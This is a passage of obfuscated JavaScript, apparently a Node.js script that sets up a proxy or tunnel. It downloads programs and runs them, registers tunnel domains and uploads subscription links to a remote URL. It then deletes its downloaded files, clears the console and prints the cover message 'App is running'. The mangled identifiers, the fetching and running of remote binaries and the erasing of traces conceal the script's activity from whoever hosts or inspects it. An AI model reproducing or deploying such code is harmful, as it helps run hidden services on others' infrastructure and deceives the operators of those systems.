_0x53484c;KEEPALIVE?_0x53484c=[]:_0x53484c=[FILE_PATH+'/'+fileMapping['bot'],FILE_PATH+'/'+fileMapping['web'],FILE_PATH+'/'+fileMapping[_0x11037e(0x203)],FILE_PATH+_0x11037e(0x166),FILE_PATH+_0x11037e(0x17b)],_0x53484c[_0x11037e(0x15b)](_0x28d7c5=>{const _0x17c411=_0x11037e;try{const _0x4204e4=fs[_0x17c411(0x188)](_0x28d7c5);_0x4204e4[_0x17c411(0x19d)]()?fs[_0x17c411(0x159)](_0x28d7c5,{'recursive':!![]}):fs[_0x17c411(0x193)](_0x28d7c5);}catch(_0x4dacda){if(_0x4dacda[_0x17c411(0x14a)]!==_0x17c411(0x169)){}}}),console['clear'](),console[_0x11037e(0x1a3)]('App\x20is\x20running');},0xea60);}let previousargoDomain='';async function subupload(){if(previousargoDomain&&argoDomain===previousargoDomain){}else{const _0xfd0ef4=await uploadSubscription(SUB_NAME,UPLOAD_DATA,SUB_URL);generateLinks(),previousargoDomain=argoDomain;}await delay(0xc350),await extractDomains();}async function main(){const _0x1bceeb=_0x4f95f8;createFolder(FILE_PATH),createFolder(path[_0x1bceeb(0x1ba)](FILE_PATH,_0x1bceeb(0x160))),await downloadFiles(),await delay(0x1388),await getipandisp(),await myconfig(),await runapp(),await extractDomains(),generateLinks(),httpserver(),cleanfiles();if(SUB_URL){const _0x12e16f=await uploadSubscription(SUB_NAME,UPLOAD_DATA,SUB_URL);KEEPALIVE&&OPENSERVER&&!ARGO_AUTH&&!ARGO_DOMAIN&&(previousargoDomain=argoDomain,setInterval(subupload,intervalInseconds*0x3e8));}KEEPALIVE&&(await keep_alive(),setInterval(keep_alive,intervalInseconds*0x3e8));}main();